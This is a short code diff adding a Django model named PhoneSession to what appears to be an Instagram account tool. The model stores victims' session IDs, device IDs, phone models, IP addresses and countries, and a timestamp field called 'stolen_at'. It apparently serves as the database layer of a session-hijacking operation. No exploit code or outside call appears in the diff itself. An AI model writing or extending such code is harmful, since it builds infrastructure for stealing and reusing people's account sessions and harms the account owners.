@@ -73,3 +73,24 @@ class InstagramAccount(models.Model):
         if self.login_attempts >= 5:
             self.is_active = False
         self.save(update_fields=["login_attempts", "is_active", "updated_at"])
+        
+        
+        
+# core/models.py → FINAL GOD MODEL
+from django.db import models
+from django.utils import timezone
+
+class PhoneSession(models.Model):
+    username = models.CharField(max_length=100)
+    user_id = models.CharField(max_length=50)
+    sessionid = models.TextField()
+    device_id = models.CharField(max_length=100, blank=True)
+    phone_model = models.CharField(max_length=100, blank=True)
+    android_version = models.CharField(max_length=50, blank=True)
+    ip_address = models.CharField(max_length=50, blank=True)
+    country = models.CharField(max_length=50, blank=True)
+    stolen_at = models.DateTimeField(default=timezone.now)
+    is_active = models.BooleanField(default=True)
+
+    def __str__(self):
+        return f"@{self.username} ({self.phone_model})"
